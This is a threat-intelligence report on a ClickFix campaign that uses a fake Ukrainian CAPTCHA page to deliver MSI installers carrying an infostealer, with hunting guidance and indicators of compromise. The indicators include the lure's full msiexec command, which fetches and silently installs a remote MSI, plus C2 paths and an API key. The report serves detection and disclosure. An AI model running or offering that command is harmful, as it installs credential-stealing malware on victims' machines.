# 2026-09-17: Ukrainian-Language ClickFix Lure, Russian-Branded Traffic Panel, and the Psychedelic Stealer

## AUTHOR
- Arctic Wolf Labs, Adversary Research

## KEY FINDINGS
- Arctic Wolf Labs identified an active ClickFix campaign using a Ukrainian-language fake browser-verification page at `uasputnik[.]com` to deliver an MSI payload.
- Panel analytics captured by Arctic Wolf Labs show that the lure site received 557 views across 32 countries; Ukraine accounts for 446 (80%), with the remainder distributed across Europe, the Americas, and Asia-Pacific.
- The lure masquerades as three legitimate Ukrainian businesses and sends the victim to the attacker-controlled domain. It is managed via a TDS console named РУБЛЁВКА TDS ("Rublevka TDS") — a Russian-coded, Ukrainian-language panel. The TDS gives operators command config, domain stats, and country breakdowns. The page tracks victim interaction via three events: "view" (on load), "click" (completed CAPTCHA), and "complete" (a click on the Done button).
- The MSI payload drops an infostealer we're calling Psychedelic Stealer (`psychedeliclove.exe`), which steals browser credentials and tokens, collects cryptocurrency-wallet data, deploys browser extensions, installs a native messaging host (`com.lunex.explorer`), establishes persistence via a scheduled task (`psychedelicloveUtils`), and communicates with an operator-controlled C2 at `193.178.159[.]128:8080` for remote tasking.
- Psychedelic Stealer is a 64-bit Windows executable that profiles the infected host — collecting OS details, hardware configuration, installed browsers, and antivirus products — before exfiltrating data. It specifically targets Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, and Yandex for credential and token theft.
- The implant's remote tasking capability supports execution of EXE, COM, BAT, CMD, MSI, and PowerShell files, giving the operator a persistent foothold for follow-on activity beyond the initial data collection.
- The campaign remains active at this time. Arctic Wolf Labs has identified multiple MSI payloads, including `elita.msi`, `miks.msi`, and `sova.msi`. A full technical analysis will follow in an upcoming Arctic Wolf Labs blog post.

## HUNTING GUIDANCE
- Hunt for `msiexec.exe` process creation where the command line contains a remote `https://` URL combined with `/passive` and a non-standard MSI property such as `ORG_NOTE`. The command executes via a Windows Run dialog (`explorer.exe`) opened by the user, not as a browser-spawned child.
- Look for scheduled task creation named `psychedelicloveUtils` and native messaging host registration for `com.lunex.explorer`, which indicates a completed Psychedelic Stealer installation.
- On networks with egress visibility, inspect connections to `193.178.159[.]128:8080` for paths beginning `/api/v1/agent/` or `/api/v1/ext/` and requests carrying an `X-API-Key` header.
- Prioritize behavioral coverage over file hashes for this campaign. New MSI and payload samples are appearing (on average) at a daily cadence, making hash-based detection a moving target.

## INDICATORS OF COMPROMISE
The indicators below represent a subset of the IOCs associated with this activity and should not be considered exhaustive.

```
# IP ADDRESSES
176[.]53[.]159[.]40 # uasputnik[.]com A record (first seen 2026-09-09, last seen 2026-09-14)
107[.]175[.]82[.]242 # psychedeliclove.exe download server (TCP 9000)
193[.]178[.]159[.]128 # Psychedelic stealer C2 (TCP 8080)

# URLS
https[:]//uasputnik[.]com/sputnik.html
https[:]//uasputnik[.]com/elita.msi
https[:]//uasputnik[.]com/miks.msi
https[:]//uasputnik[.]com/astra.msi
https[:]//uasputnik[.]com/harbor.msi
https[:]//uasputnik[.]com/neon.msi
https[:]//uasputnik[.]com/sova.msi
https[:]//uasputnik[.]com/vyse.msi
https[:]//uasputnik[.]com/admin777111777.php # lure-side command retrieval and beacon endpoint
https[:]//www.uasputnik[.]com
http[:]//107[.]175[.]82[.]242:9000/wilow/psychedeliclove.exe
http[:]//193[.]178[.]159[.]128:8080

# SHA256
38e90affe37342ee36917cdc535fe9bf04589afa8430eb8d1ba1016adcfc1878 # elita.msi
28f8494b273ed029a75b5491ce24333bf03ddc6c9b312b2fccc845b93dfaff02 # miks.msi
7c132a7a7bdd511b026f1fa5f817880b7063bd454b38f6670410d1e09dd84ec6 # miks.msi (2)
816cb88f5f5ab81c7178d5c1238ca868468414ad1bd4c0c72a8c0fe895593b29 # sova.msi
1dfa69c3f4255f2b954f2c36bc55e043ca6d1ac92f1d22a4627e5277a416d3b8 # PayloadFile1
bf14cd6c3328ebd08e940478b5d1da04e9e5aa576d045d41950bf4f1e2456dd8 # PayloadFile1 (2)
cd25712256b268c19eea2630ec652e17e55e1095cd4dd7b90b3b396271b0c5df # PayloadFile1 (3)
06f434695f93d7fd11eeff71358ff69fed79d310a66d993bbcc4ff979c117c90 # psychedeliclove.exe

# FILENAMES
astra.msi
elita.msi
harbor.msi
miks.msi
neon.msi
sova.msi
vyse.msi
psychedeliclove.exe

# SCHEDULED TASKS
psychedelicloveUtils

# NATIVE MESSAGING HOSTS
com.lunex.explorer

# C2 PATHS
/api/v1/checkin
/api/v1/agent/config
/api/v1/agent/ping?hwid=%s
/api/v1/agent/tasks?hwid=%s
/api/v1/agent/tasks/%llu/ack
/api/v1/ext/passwords
/api/v1/ext/tokens
/api/v1/ext/wallets

# C2 API KEY
c9daf8dbafc5e1f63e4af742a14a8a6669365e106ab0247ab366621bbc1f6967

# COMMAND LINES
msiexec.exe /i "https://uasputnik[.]com/elita.msi" /passive ORG_NOTE="Захист від автоматичних запитів… ✔️ Підтверджую, що я не робот." # ORG_NOTE: "Protection against automated requests… I confirm that I am not a robot."

# MSI PROPERTIES
ORG_NOTE # verification-themed property passed in the clipboard command

# LURE IDENTIFIERS
34as77 # fixed visitor identifier in lure agreement text

# BROWSER EXTENSION IDS (WALLET TARGETS)
nkbihfbeogaeaoehlefnkodbefgpgknn # MetaMask (Chrome)
ejbalbakoplchlghecdalmeeeajnimhm # MetaMask (Edge)
egjidjbpglichdcondbcbdnbeeppgdph # Trust Wallet (Chrome)
mcohilncbfahbmgdjkbpemcciiolgcge # OKX Wallet (Chrome)
pbpjkcldjiffchgbbndmhojiacbgflha # OKX Wallet (Edge)
lgmpcpglpngdoalbgeoldeajfclnhafa # SafePal (Chrome)
```
